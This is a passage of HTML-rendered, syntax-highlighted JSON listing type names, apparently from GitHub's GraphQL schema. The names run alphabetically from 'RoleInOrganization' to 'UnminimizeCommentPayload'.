class="string">&quot;RoleInOrganization&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SamlDigestAlgorithm&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SamlSignatureAlgorithm&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SavedReply&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SavedReplyConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SavedReplyEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SavedReplyOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SavedReplyOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SearchResultItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SearchResultItemConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SearchResultItemEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SearchType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisory&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryEcosystem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryIdentifier&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryIdentifierFilter&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryIdentifierType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryPackage&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryPackageVersion&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryReference&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisorySeverity&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityVulnerability&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityVulnerabilityConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityVulnerabilityEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityVulnerabilityOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityVulnerabilityOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetEnterpriseIdentityProviderInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetEnterpriseIdentityProviderPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetOrganizationInteractionLimitInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetOrganizationInteractionLimitPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetRepositoryInteractionLimitInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetRepositoryInteractionLimitPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetUserInteractionLimitInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetUserInteractionLimitPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SmimeSignature&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Sponsor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Sponsorable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorableItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorableItemConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorableItemEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorableOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorableOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivity&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivityAction&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivityConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivityEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivityOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivityOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivityPeriod&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsGoal&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsGoalKind&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsListing&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsTier&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsTierAdminInfo&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsTierConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsTierEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsTierOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsTierOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Sponsorship&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipNewsletter&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipNewsletterConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipNewsletterEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipNewsletterOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipNewsletterOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipPrivacy&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StarOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StarOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StargazerConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StargazerEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Starrable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StarredRepositoryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StarredRepositoryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StartRepositoryMigrationInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StartRepositoryMigrationPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Status&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StatusCheckRollup&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StatusCheckRollupContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StatusCheckRollupContextConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StatusCheckRollupContextEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StatusContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StatusState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;String&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SubmitPullRequestReviewInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SubmitPullRequestReviewPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Submodule&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SubmoduleConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SubmoduleEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Subscribable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SubscribedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SubscriptionState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SuggestedReviewer&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Tag&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Team&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamAddMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamAddRepositoryAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamChangeParentTeamAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussion&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionCommentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionCommentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionCommentOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionCommentOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamMemberConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamMemberEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamMemberOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamMemberOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamMemberRole&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamMembershipType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamPrivacy&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRemoveMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRemoveRepositoryAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRepositoryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRepositoryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRepositoryOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRepositoryOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRole&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TextMatch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TextMatchHighlight&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Topic&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TopicAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TopicSuggestionDeclineReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TransferIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TransferIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TransferredEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Tree&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TreeEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;URI&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnarchiveRepositoryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnarchiveRepositoryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnassignedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnfollowUserInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnfollowUserPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UniformResourceLocatable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnknownSignature&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnlabeledEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnlinkRepositoryFromProjectInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnlinkRepositoryFromProjectPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnlockLockableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnlockLockablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnlockedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkDiscussionCommentAsAnswerInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkDiscussionCommentAsAnswerPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkFileAsViewedInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkFileAsViewedPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkIssueAsDuplicateInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkIssueAsDuplicatePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkedAsDuplicateEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnminimizeCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnminimizeCommentPayload&quot;</span></span><br><span class="line">        